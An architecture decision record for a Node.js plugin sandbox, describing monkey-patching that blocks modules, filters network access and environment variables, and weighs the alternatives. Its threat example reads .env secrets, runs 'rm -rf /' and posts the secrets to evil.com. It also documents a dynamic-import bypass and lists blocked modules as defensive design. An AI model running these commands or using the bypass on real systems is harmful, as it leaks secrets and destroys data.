# ADR-0017: Deno-Style Sandbox Hardening for Subprocess Mode

**Status:** Accepted
**Date:** 2025-12-20
**Deciders:** Architecture Team
**Related:** ADR-0016 (Standalone Bootstrap for Subprocess Execution)

## Context

KB Labs plugin system runs plugins in two modes:
- **in-process (dev mode)**: Plugin code runs in same process as CLI, with full access to all APIs
- **subprocess (production)**: Plugin code runs in forked child process for isolation

Currently, subprocess mode provides **process-level isolation** (separate memory, separate PID) but does NOT restrict what Node.js APIs the plugin can access. A plugin can bypass the `ctx.runtime.*` permission system by directly importing Node.js built-in modules:

```typescript
// Plugin bypassing permissions
import { readFile } from 'node:fs/promises';
import { spawn } from 'node:child_process';
import { fetch } from 'undici';

// Direct access - NO permission checks!
const secrets = await readFile('.env', 'utf-8');
spawn('rm', ['-rf', '/']);
await fetch('https://evil.com', { method: 'POST', body: secrets });
```

This creates a security gap where malicious or buggy plugins can:
1. Read files outside allowed paths (bypass `permissions.fs.read`)
2. Write files outside allowed paths (bypass `permissions.fs.write`)
3. Make network requests to blocked domains (bypass `permissions.network.fetch`)
4. Execute arbitrary shell commands (bypass `permissions.shell`)
5. Access environment variables (bypass `permissions.env.read`)
6. Kill the CLI process with `process.exit()`

## Decision

Implement **Deno-style monkey-patching** to harden the subprocess sandbox. This approach:
1. Intercepts dangerous Node.js APIs via monkey-patching
2. Checks permissions before allowing access
3. Provides clear error messages when violations occur
4. Maintains backward compatibility (plugins using `ctx.runtime.*` work unchanged)
5. Is reversible (patches are cleaned up on exit)

### Architecture

```
┌─────────────────────────────────────────────────────┐
│ Parent Process (CLI)                                 │
│                                                      │
│  executeCommandV3()                                  │
│        │                                             │
│        ├─ devMode = false → runInSubprocess()       │
│        │                                             │
│        └─ fork(bootstrap.js) ──────────────┐        │
└────────────────────────────────────────────┼────────┘
                                              │
                                              │ IPC
                                              ▼
┌─────────────────────────────────────────────────────┐
│ Child Process (Plugin Sandbox)                       │
│                                                      │
│  bootstrap.js                                        │
│  ┌─────────────────────────────────────┐            │
│  │ 1. applySandboxPatches()            │            │
│  │    - patchRequire()                 │            │
│  │    - patchFetch()                   │            │
│  │    - patchProcessEnv()              │            │
│  │    - patchProcessExit()             │            │
│  └─────────────────────────────────────┘            │
│               │                                      │
│               ▼                                      │
│  ┌─────────────────────────────────────┐            │
│  │ 2. Load plugin handler               │            │
│  │    import('./path/to/handler.js')   │            │
│  └─────────────────────────────────────┘            │
│               │                                      │
│               ▼                                      │
│  ┌─────────────────────────────────────┐            │
│  │ 3. Execute handler                   │            │
│  │    handler.execute(ctx, input)      │            │
│  └─────────────────────────────────────┘            │
│               │                                      │
│               ▼                                      │
│  ┌─────────────────────────────────────┐            │
│  │ 4. restoreSandbox() (cleanup)       │            │
│  └─────────────────────────────────────┘            │
└─────────────────────────────────────────────────────┘
```

### What is Monkey-Patched

#### 1. Module.prototype.require (Block Dangerous Modules)

**Blocked modules:**
- `child_process`, `node:child_process`
- `cluster`, `node:cluster`
- `http`, `https`, `net`, `tls` (use `ctx.runtime.fetch` instead)
- `dns`, `dgram`
- `vm`, `node:vm`
- `worker_threads`, `node:worker_threads`
- `fs`, `node:fs`, `fs/promises`, `node:fs/promises` (use `ctx.runtime.fs` instead)

**Error message:**
```
[SANDBOX] Module "child_process" is blocked for security.
If you need this functionality, request it via ctx.platform APIs.
```

#### 2. globalThis.fetch (Network Access Control)

**Permission check:** `permissions.network.fetch` (array of URL patterns)

**Pattern matching:**
- `*` → Allow all
- `*.github.com` → Allow all subdomains of github.com
- `api.github.com` → Allow exact hostname
- `https://api.github.com/*` → Allow all URLs starting with this

**Error message:**
```
[SANDBOX] Fetch to "evil.com" is not allowed.
Allowed patterns: api.github.com, *.npmjs.org
Add to manifest: permissions.network.fetch
```

#### 3. process.env (Environment Variable Filtering)

**Permission check:** `permissions.env.read` (array of env var patterns)

**Pattern matching:**
- `KB_*` → Allow all vars starting with KB_ (wildcard)
- `API_KEY` → Allow exact var name

**Behavior:** Returns filtered `process.env` object with only allowed keys

#### 4. process.exit (Prevent CLI Termination)

**Behavior:** Always blocks with error message

**Error message:**
```
[SANDBOX] process.exit() is blocked. Return from handler instead.
Use: return { exitCode: 1 }
```

### Implementation Details

**File:** `kb-labs-plugin/packages/plugin-runtime/src/sandbox/harden.ts`

**Key features:**
- **Reversible patches**: All originals saved in Map, restored on cleanup
- **ESM compatibility**: Uses `createRequire(import.meta.url)` for ESM context
- **Audit trail**: Violations logged to stderr with emoji indicators
- **Stack trace**: Shows exact violation location (top 5 frames) configurable via `KB_SANDBOX_TRACE`
- **Mode support**: `enforce` (block) or `compat`/`warn` (native + warning)
- **Simple implementation**: No proxying, no context holder, no complex transformations

**Invocation:** `bootstrap.ts`
```typescript
// Read sandbox mode from environment (KB_SANDBOX_MODE)
const sandboxMode = (process.env.KB_SANDBOX_MODE || 'enforce') as SandboxMode;

const restoreSandbox = applySandboxPatches({
  permissions: descriptor.permissions,
  mode: sandboxMode, // 'enforce' | 'compat' | 'warn'
});
```

**Cleanup:** `bootstrap.ts` finally block
```typescript
restoreSandbox(); // Restore original globals
```

## Alternatives Considered

### 1. VM2 (Isolated JavaScript VM)

**Pros:**
- True JavaScript VM isolation (similar to browser iframes)
- Hardest to escape

**Cons:**
- **Performance**: 10-100x slower execution
- **Breaking changes**: Breaks all plugins using Node.js APIs
- **Debugging**: Very hard to debug (no Chrome DevTools)
- **Maintenance**: VM2 project archived, security vulnerabilities

**Verdict:** Too slow and breaks all existing plugins

### 2. isolated-vm (V8 Isolate)

**Pros:**
- V8-level isolation (Chrome security model)
- Faster than VM2

**Cons:**
- **Native dependencies**: Requires C++ compilation
- **Complex API**: Very hard to implement message passing
- **Breaking changes**: Same as VM2

**Verdict:** Too complex for MVP

### 3. Isolated Workdir + Virtual FS

**Pros:**
- Run subprocess in `/tmp/kb-plugin-xyz/` with empty directory
- File access only via `ctx.runtime.fs` (RPC to parent)

**Cons:**
- **Doesn't solve fetch**: Plugin can still `fetch('https://evil.com')`
- **Doesn't solve env**: Plugin can still read `process.env`
- **Doesn't solve absolute paths**: Plugin can `readFile('/etc/passwd')`

**Verdict:** Partial solution, needs monkey-patching anyway

### 4. Container Mode (Future)

**Pros:**
- OS-level isolation (Docker/Podman)
- 100% secure (kernel namespaces, cgroups)

**Cons:**
- **Complexity**: Requires Docker daemon
- **Performance**: 100-500ms startup overhead
- **Portability**: Doesn't work on all systems

**Verdict:** Best long-term solution, but overkill for MVP

## Trade-offs

### Security vs Usability

**Enforce mode (high security, some limitations):**
- ✅ Blocks fs/http/child_process access
- ✅ Blocks dangerous modules (vm, worker_threads, cluster, net, dns)
- ✅ Provides clear error messages with migration guidance
- ✅ Blocks process.exit() and process.chdir()
- ⚠️ Bypassable by ESM dynamic imports (`await import('node:fs')`)
- ⚠️ Third-party libraries may not work (require ctx.runtime.* APIs)
- ❌ **True security only in container mode** (future)

**Compat/Warn mode (100% compatibility, low security):**
- ✅ 100% third-party library compatibility
- ✅ All Node.js APIs work as expected
- ✅ Clear deprecation warnings for migration
- ✅ Still blocks dangerous modules (vm, worker_threads, etc.)
- ⚠️ fs/http/child_process use native modules (not governed)
- ❌ Security via code review and trust, not technical enforcement

**Usability (High in both modes):**
- ✅ Minimal breaking changes (plugins using `ctx.runtime.*` work unchanged)
- ✅ Clear migration path (error messages point to `ctx.runtime.*`)
- ✅ Debugging works (no VM isolation)
- ✅ Performance impact negligible (<1ms overhead)
- ✅ Bootstrap size reduced (67KB → 47KB)

### Comparison Matrix

| Approach | Security | Performance | Compatibility | Debugging | Verdict |
|----------|----------|-------------|---------------|-----------|---------|
| **Enforce mode** | 70% | 99% | Medium | Easy | ✅ First-party |
| **Compat mode** | 30% | 99% | 100% | Easy | ✅ Third-party |
| VM2 | 95% | 10% | Low | Hard | ❌ Too slow |
| isolated-vm | 98% | 60% | Low | Hard | ❌ Too complex |
| Isolated workdir | 40% | 95% | Medium | Easy | ❌ Partial |
| Container | 100% | 50% | High | Medium | ⏭️ Future |

## Consequences

### Positive

1. **Two-mode approach**: Enforce for first-party, compat for third-party plugins
2. **Clear error messages**: Plugins know exactly what to fix
3. **Stack trace on violations**: Shows exact location in code (even in node_modules)
4. **Backward compatible**: Existing plugins using `ctx.runtime.*` work unchanged
5. **100% compatibility in compat mode**: All third-party libraries work (simple-git, conventional-changelog, etc.)
6. **Smooth migration path**: Three-phase migration (compat → fix warnings → enforce)
7. **Debugging works**: No VM isolation = normal debugging
8. **Performance**: Negligible overhead (<1ms)
9. **Reversible**: Patches cleaned up on exit (no global state pollution)
10. **Process.chdir() blocked**: Prevents directory escape attacks
11. **Smaller bootstrap**: 67KB → 47KB after removing proxy code
12. **Simpler code**: No complex proxy objects to maintain

### Negative

1. **Not 100% secure**: Determined attacker can bypass
2. **ESM dynamic imports**: `await import('node:fs')` NOT blocked (only `require()` is patched)
3. **Compat mode is not secure**: Native modules bypass all permission checks
4. **Maintenance**: Need to keep blocked module list updated

### Known Limitations

**ESM Dynamic Imports (bypass vector):**
```typescript
// This will NOT be blocked (ESM dynamic import)
const fs = await import('node:fs/promises');
await fs.readFile('.env', 'utf-8'); // Works!
```

**Why:** We only patch `Module.prototype.require`, not dynamic `import()` function. Patching dynamic imports requires much deeper runtime interception.

**Mitigation:** Rely on process isolation (subprocess) as primary defense. Monkey-patching is defense-in-depth, not primary security boundary.

**Future:** Container mode will provide full isolation regardless of import mechanism

### Migration Required

Plugins using direct Node.js APIs must migrate to `ctx.runtime.*`:

**Before:**
```typescript
import { readFile } from 'node:fs/promises';
const data = await readFile('.kb/config.json', 'utf-8');
```

**After:**
```typescript
const data = await ctx.runtime.fs.readFile('.kb/config.json', 'utf-8');
```

### Stack Trace Example

When violations occur, stack trace helps identify the exact source (even in `node_modules`):

```
🚫 [SANDBOX BLOCK] fs: Direct fs access is blocked.
Use ctx.runtime.fs instead.

📍 Violation location:
  at require (node:internal/modules/helpers:182:18)
  at Object.<anonymous> (/path/node_modules/@kwsites/file-exists/dist/src/index.js:6:14)
  at Module._compile (node:internal/modules/cjs/loader:1529:14)
  at Module._extensions..js (node:internal/modules/cjs/loader:1613:10)
  at Module.load (node:internal/modules/cjs/loader:1275:32)
```

This immediately reveals:
- **Culprit**: `@kwsites/file-exists` (transitive dependency of `simple-git`)
- **Location**: Line 6 in `index.js`
- **Root cause**: Third-party library using `require('fs')`

Without stack trace, finding this would require manual code inspection across the entire dependency tree.

## Compatibility Mode (Updated 2025-12-20)

### Environment Variable

`KB_SANDBOX_MODE` controls sandbox behavior:

- **`enforce`** (default): Block violations, throw errors (strict mode)
- **`compat`**: Allow native modules with deprecation warnings (full compatibility)
- **`warn`**: Same as compat (log warnings, allow all access)

### Usage

```bash
# Strict mode (recommended for production with first-party plugins)
KB_SANDBOX_MODE=enforce pnpm kb release:plan

# Compatibility mode (for third-party libraries like simple-git, conventional-changelog)
KB_SANDBOX_MODE=compat pnpm kb release:plan

# Warn only (alias for compat)
KB_SANDBOX_MODE=warn pnpm kb release:plan
```

### Simplified Approach (2025-12-20 Decision)

**Previous approach (removed):** Proxy native modules to `ctx.runtime.*` APIs with compatibility shims.

**Problem:** Third-party libraries use complex patterns (Dirent methods, sync APIs, callback forms) that require extensive proxying. Each edge case required more code, more bugs, more maintenance.

**New approach:** In compat/warn mode, return native Node.js modules with deprecation warnings. No proxying.

**Rationale:**
1. **100% compatibility** - Native fs, http, child_process work exactly as expected
2. **Simpler code** - Removed ~500 lines of proxy code
3. **Fewer bugs** - No more edge cases with Dirent methods, sync fallbacks, etc.
4. **Honest about security** - We don't claim compat mode is secure (it's not)
5. **VSCode-like model** - Extensions have full access, security via code review/trust

### What Happens in Compat Mode

**Example: Plugin using native `fs`**

```typescript
// Plugin code (third-party library or legacy plugin)
import { readFile, stat } from 'node:fs/promises';
import { existsSync } from 'node:fs';

const data = await readFile('.kb/config.json', 'utf-8');
const stats = await stat(filePath);
if (existsSync('.git')) { /* ... */ }
```

**What happens:**

```
⚠️  [COMPAT] Direct fs access detected. Using native fs.
   Migrate to: await ctx.runtime.fs.readFile(path)
   Set KB_SANDBOX_MODE=enforce to block this in future
```

**The native `fs` module is returned.** No proxying, no transformation.
Warning appears once per module type per session.

### Blocked Modules (Always)

These modules are blocked in ALL modes (enforce, compat, warn):

| Module | Reason | Alternative |
|--------|--------|-------------|
| `cluster`, `node:cluster` | Process isolation risk | N/A |
| `vm`, `node:vm` | Code execution risk | N/A |
| `worker_threads`, `node:worker_threads` | Code execution risk | N/A |
| `net`, `node:net`, `tls`, `node:tls` | Low-level network risk | Use `ctx.runtime.fetch()` |
| `dns`, `node:dns`, `dgram`, `node:dgram` | Network risk | Use `ctx.runtime.fetch()` |

These cannot be allowed even in compat mode because they enable:
- Arbitrary code execution (vm, worker_threads)
- Low-level network access (net, tls, dns)
- Process spawning outside sandbox (cluster)

### Governed Modules by Mode

| Module | enforce | compat/warn |
|--------|---------|-------------|
| `fs`, `fs/promises` | ❌ Block | ✅ Native + warn |
| `http`, `https` | ❌ Block | ✅ Native + warn |
| `child_process` | ❌ Block | ✅ Native + warn |
| `path` | ✅ Allow | ✅ Allow |

### Migration Path

**Phase 1: Start with compat mode (safe)**
```bash
# Use compat for third-party plugins or migration period
export KB_SANDBOX_MODE=compat
```

**Phase 2: Review warnings and update code**
```diff
# When you see warnings in your plugin code (not dependencies):
- import { readFile } from 'node:fs/promises';
- const data = await readFile('.kb/config.json', 'utf-8');
+ const data = await ctx.runtime.fs.readFile('.kb/config.json', 'utf-8');
```

**Phase 3: Switch to enforce for first-party plugins**
```bash
# Only after updating your plugin code:
export KB_SANDBOX_MODE=enforce
```

**Note:** If using third-party libraries (simple-git, conventional-changelog, etc.),
you may need to stay on compat mode indefinitely. This is acceptable - the security
boundary moves to code review and plugin trust level.

### Implementation

**File:** `sandbox/harden.ts`

**Flow (simplified):**
```
1. bootstrap.ts applies patches (mode from KB_SANDBOX_MODE)
2. Plugin requires 'fs', 'http', or 'child_process'
3. harden.ts intercepts require()
4. harden.ts checks mode:
   - enforce → throw error with helpful message
   - compat/warn → log deprecation warning + return original native module
5. Plugin gets native module, works exactly as expected
```

**No proxy creation, no context holder, no complex transformations.**

## Resource Protection (Out of Scope)

The following attack vectors are handled by **platform quotas**, not sandbox patches:

### 1. DoS via Infinite Loops/Timers
**Protected by:** `permissions.quotas.timeoutMs` (default 30s)
```typescript
// This gets killed after timeout
while(true) { /* spam */ }
setInterval(() => {}, 0); // CPU spike
```
**Mitigation:** Process killed with `SIGKILL` after timeout ([runner.ts:228-234](../../kb-labs-plugin/packages/plugin-runtime/src/sandbox/runner.ts#L228-L234))

### 2. Memory DoS
**Protected by:** `permissions.quotas.memoryMb` (future implementation)
```typescript
// This should trigger OOM killer
const spam = [];
while(true) spam.push(new Array(1000000));
```
**Mitigation:** OS-level memory limits via cgroups (container mode)

### 3. Console Spam
**Not protected:** Plugins can flood stdout/stderr
```typescript
while(true) console.log('spam');
```
**Mitigation:** Parent process can buffer/throttle output, or kill on timeout

### 4. Global Pollution
**Not protected:** Plugins can override globals
```typescript
globalThis.Object = null;
globalThis.Promise = FakePromise;
```
**Mitigation:** Process isolation (subprocess) - only affects plugin itself

## Future Work

1. **Container mode**: Add third execution mode (in-process, subprocess, container) for true OS-level isolation
2. **Audit logs**: Send violation events to analytics for monitoring
3. **Memory quotas**: Implement `memoryMb` enforcement via cgroups
4. **Permission prompts**: Ask user at runtime for permission escalation
5. **ESM import blocking**: Investigate blocking `await import('node:fs')` (currently not blocked)

## Completed Features

1. ✅ **Compatibility mode** (`KB_SANDBOX_MODE=compat`): Native modules + deprecation warnings
2. ✅ **Warn mode** (`KB_SANDBOX_MODE=warn`): Alias for compat mode
3. ✅ **Stack trace on violations**: Shows exact source location (configurable via `KB_SANDBOX_TRACE`)
4. ✅ **Simplified implementation**: Removed proxy code, 100% third-party compatibility
5. ✅ **Dangerous module blocking**: vm, worker_threads, cluster, net, dns blocked in all modes

## Security Model (Updated 2025-12-20)

### Honest Assessment

**Subprocess sandbox provides different security levels based on mode:**

| Mode | fs/http/child_process | Blocked Modules | Security Level |
|------|----------------------|-----------------|----------------|
| **enforce** | ❌ Blocked | ✅ Blocked | High (first-party plugins) |
| **compat/warn** | ✅ Native + warning | ✅ Blocked | Low (third-party compat) |

### What Subprocess Mode Provides

**Always provided (any mode):**
1. **Process isolation** - Crash/hang doesn't kill CLI
2. **Timeout protection** - Runaway plugins killed after 30s
3. **Dangerous module blocking** - vm, worker_threads, cluster, net, dns always blocked
4. **Exit protection** - process.exit() blocked
5. **Chdir protection** - process.chdir() blocked

**Enforce mode only:**
6. **fs/http/child_process blocking** - Must use ctx.runtime.* APIs
7. **Network whitelist** - Only allowed domains via fetch

### What It Does NOT Provide

**Subprocess is NOT fully secure against:**
- Determined attackers who can bypass monkey-patching
- ESM dynamic imports (`await import('node:fs')`) - NOT blocked
- Malicious third-party libraries (in compat mode)
- Memory/CPU DoS (partially mitigated by timeouts)

### Security Boundary

```
┌─────────────────────────────────────────────────────────────┐
│ ENFORCE MODE                                                 │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ First-party plugins (your code)                          │ │
│ │ ✅ Must use ctx.runtime.* APIs                          │ │
│ │ ✅ Full permission governance                           │ │
│ │ ✅ Audit logging                                        │ │
│ └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ COMPAT MODE                                                  │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Third-party plugins (simple-git, conventional-changelog) │ │
│ │ ⚠️ Uses native Node.js APIs                              │ │
│ │ ⚠️ Bypasses permission governance                       │ │
│ │ ⚠️ Security via: code review, trust, container (future) │ │
│ └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ CONTAINER MODE (Future)                                      │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Any code                                                  │ │
│ │ ✅ OS-level isolation (namespaces, cgroups)              │ │
│ │ ✅ True security boundary                                │ │
│ │ ✅ Network policies at kernel level                      │ │
│ └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### Why Proxying Was Removed

**Original approach (ADR-0017 v1):** Proxy native modules to ctx.runtime.* APIs.

**Problems encountered:**
1. **Dirent methods** - `entry.dirent.isSymbolicLink()` not a function
2. **Sync API limitation** - Cannot synchronously unwrap Promises
3. **Callback forms** - Complex to proxy fs.readFile(path, cb)
4. **Edge cases** - Each third-party library found new edge cases
5. **Code complexity** - ~500 lines of proxy code, growing

**Decision (2025-12-20):**
> "Вопрос. А вообще хороший подход насильно в это лезть? Как будто чем дальше
> мы пытаемся это отладить - тем больше боли + баги + костыли."
> — Project discussion

**Resolution:** Remove all proxying in compat mode. Return native modules + warnings.

**Benefits:**
- Bootstrap size: 67KB → 47KB (-20KB)
- Removed ~500 lines of proxy code
- 100% compatibility with third-party libraries
- Honest about security model (compat = no security)

### Recommended Usage

**For first-party plugins (your code):**
```bash
KB_SANDBOX_MODE=enforce  # Strict, use ctx.runtime.* APIs
```

**For third-party plugins/libraries:**
```bash
KB_SANDBOX_MODE=compat  # Allow native modules, log warnings
```

**For debugging:**
```bash
KB_SANDBOX_TRACE=1  # Show stack traces on violations
KB_SANDBOX_TRACE=0  # Suppress stack traces
```

## References

- [Deno Permissions](https://deno.land/manual@v1.36.0/basics/permissions)
- [Node.js VM2 Security](https://github.com/patriksimek/vm2/security)
- [Web Platform Security Model](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [ADR-0016: Standalone Bootstrap for Subprocess Execution](./0016-standalone-bootstrap-for-subprocess-execution.md)
- [ADR-0010: Sandbox Execution Model](./0010-sandbox-execution-model.md)
- [ADR-0013: Sandbox UI Output via Stdout](./0013-sandbox-ui-output-via-stdout.md)
